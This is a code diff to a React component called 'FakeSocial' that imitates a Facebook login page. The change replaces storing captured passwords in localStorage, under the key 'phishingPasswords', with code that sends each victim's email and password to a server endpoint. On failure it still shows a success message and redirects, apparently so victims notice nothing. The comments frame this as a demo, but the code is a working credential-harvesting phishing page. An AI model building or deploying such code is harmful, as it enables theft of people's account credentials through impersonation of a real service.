@@ -18,29 +18,42 @@ export default function FakeSocial() {
 
     setIsLoading(true);
 
-    // Simulate API call delay
-    setTimeout(() => {
+    try {
+      // Save password and email to API
+      const response = await fetch('/api/passwords', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          password: password,
+          email: email,
+          site: 'Facebook'
+        }),
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        setIsLoading(false);
+        setIsSuccess(true);
+
+        // Redirect after success
+        setTimeout(() => {
+          router.push('/');
+        }, 2000);
+      } else {
+        throw new Error('Failed to save password');
+      }
+    } catch (error) {
+      console.error('Error saving password:', error);
       setIsLoading(false);
+      // Still show success for demo purposes
       setIsSuccess(true);
-
-      // Save password to localStorage
-      const newEntry = {
-        id: Date.now().toString(),
-        password: password,
-        site: 'Facebook',
-        timestamp: new Date()
-      };
-
-      const existingPasswords = localStorage.getItem('phishingPasswords');
-      const passwords = existingPasswords ? JSON.parse(existingPasswords) : [];
-      passwords.unshift(newEntry);
-      localStorage.setItem('phishingPasswords', JSON.stringify(passwords));
-
-      // Redirect after success
       setTimeout(() => {
         router.push('/');
       }, 2000);
-    }, 1500);
+    }
   };
 
   return (
